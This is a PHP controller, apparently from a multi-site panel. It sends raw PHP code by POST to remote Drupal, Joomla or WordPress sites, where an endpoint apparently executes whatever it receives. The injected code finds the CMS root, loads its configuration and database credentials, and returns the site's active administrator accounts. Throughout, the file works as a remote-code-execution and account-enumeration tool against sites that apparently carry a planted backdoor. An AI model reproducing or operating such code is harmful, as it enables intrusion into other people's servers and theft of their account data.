<?php

if (!isset($_POST['domain_id'])) {
    print json_encode(array("result" => "internalerror"));
    return;
}

$TDomain = $application->compDriver($element->domainSource);
$domain = $TDomain->get($_POST['domain_id']);
$TDomain_integration = $application->compDriver($element->domainSource . "_integration");

if ($domain->type == 2) {
    // Drupal
    $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "sites" && file_exists($dirName . "sites/default/settings.php")) {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result"=>"nodir"));
	exit();
    }
    chdir($dir);
    include("sites/default/settings.php");
    $pdo = new PDO("mysql:host={$databases[\'default\'][\'default\'][\'host\']};dbname={$databases[\'default\'][\'default\'][\'database\']};charset=utf8", $databases[\'default\'][\'default\'][\'username\'], $databases[\'default\'][\'default\'][\'password\']);
    $dbQuery = $pdo->query("SELECT uid, name FROM `{$databases[\'default\'][\'default\'][\'prefix\']}users_field_data` WHERE status = 1 AND name <> \'\' AND uid = (SELECT entity_id FROM {$databases[\'default\'][\'default\'][\'prefix\']}user__roles WHERE roles_target_id = \'administrator\') ");
    if (!$dbQuery) {
        print json_encode(array("result" => "internalerror", "data" => $rows));
        return;
    }
    $rows = $dbQuery->fetchAll(PDO::FETCH_CLASS);
    if (!$rows) {
        print json_encode(array("result" => "empty", "data" => array()));
        return;
    }
    print json_encode(array("result" => "success", "data" => $rows));
    ';
} else if ($domain->type == 1) {
    // Joomla
    $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "includes" && file_exists($dirName . "includes/framework.php")) {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result" => "nodir"));
	exit();
    }
    chdir($dir);
    $dir = preg_replace("/\/$/", "", $dir);
    define("_JEXEC", 1);
    define("JPATH_BASE", "./");
    require_once JPATH_BASE . "/includes/defines.php";
    require_once JPATH_BASE . "/includes/framework.php";
    $db = JFactory::getDbo();
    $query = $db->getQuery(true);
    $query->select("id, username")
            ->from($db->qn("#__users"))
            ->where("block = 0 AND id in (SELECT user_id FROM {$db->qn("#__user_usergroup_map")} WHERE group_id in (SELECT id FROM {$db->qn("#__usergroups")} WHERE title in (\'Administrator\', \'Super Users\') ))");
    $db->setQuery($query);
    if (!$db) {
        print json_encode(array("result" => "internalerror", "data" => array()));
        exit();
    }
    $rows = $db->loadObjectList();
    if (!$rows) {
        print json_encode(array("result" => "empty", "data" => array()));
        return;
    }
    print json_encode(array("result" => "success", "data" => $rows));
    ';
} else if ($domain->type == 0) {
    // wordpress
    $message = '
    function findDir($dirName) {
        $dirh = opendir($dirName);
        if ($dirh) {
            while (($dirElement = readdir($dirh)) !== false) {
                if ($dirElement == "wp-load.php") {
                    closedir($dirh);
                    return $dirName;
                }
            }
            closedir($dirh);
            return findDir("$dirName../");
        }
        return "";
    }
    $dir = findDir("./");
    if (!$dir) {
	print json_encode(array("result" => "nodir"));
	exit();
    }
    chdir($dir);
    $dir = preg_replace("/\/$/", "", $dir);
    require_once("wp-load.php");
    $sql = $wpdb->prepare("SELECT ID, user_login FROM $wpdb->users WHERE user_status = 0 AND ID in (SELECT user_id FROM `wp_usermeta` WHERE meta_value LIKE \'%administrator%\' GROUP BY user_id)", null);
    if (!$sql) {
        print json_encode(array("result" => "empty", "data" => array()));
        exit();
    }
    $rows = $wpdb->get_results($sql);
    if (!$rows) {
        print json_encode(array("result" => "empty", "data" => array()));
        return;
    }
    print json_encode(array("result" => "success", "data" => $rows));
    ';
}
$message = urlencode($message);
$message = trim($message);
$message = preg_replace("/\r|\n/", "", $message);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $domain->url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "code=$message");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
if (!$server_output) {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "0"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "0", "datetime" => "NOW()"));
    print json_encode(array("result" => "noconnect"));
    return;
}
$obj = json_decode($server_output);
if (!isset($obj->result)) {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "1"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "1", "datetime" => "NOW()"));
    print json_encode(array("result" => "internalerror"));
    return;
}
if ($obj->result != "success") {
    $TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "2"));
    $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "2", "datetime" => "NOW()"));
    print json_encode(array("result" => $obj->result));
    return;
}
$TDomain->updateFields($domain->id, array("datetime" => "NOW()", "checkStatus" => "3"));
$id = $TDomain_integration->createByFields(array("parent_id" => $domain->id, "status" => "3", "datetime" => "NOW()"));
$TPost = $application->compDriver($element->postCache);

// Response adaptor
if ($domain->type == 1) {
    // Joomla
    foreach ($obj->data as $o) {
        $o->name = $o->username;
    }
} else if ($domain->type == 0) {
    // Wordpress
    foreach ($obj->data as $o) {
        $o->id = $o->ID;
        $o->name = $o->user_login;
    }
} else if ($domain->type == 2) {
    // Drupal
    foreach ($obj->data as $o) {
        $o->id = $o->uid;
    }
}
print json_encode(array("result" => "success", "data" => $obj->data));
